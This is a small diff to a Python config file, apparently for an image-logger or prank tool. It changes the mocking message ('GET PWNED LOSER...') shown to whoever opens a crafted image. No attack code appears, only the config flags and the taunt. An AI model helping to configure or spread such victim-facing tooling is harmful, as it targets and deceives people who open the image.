@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "GET FUCKING PWNED LOSER", # Message to show
+        "message": "GET PWNED LOSER HAHAHHAHHAHAHHAHAHAHHAHHAHAHAH", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
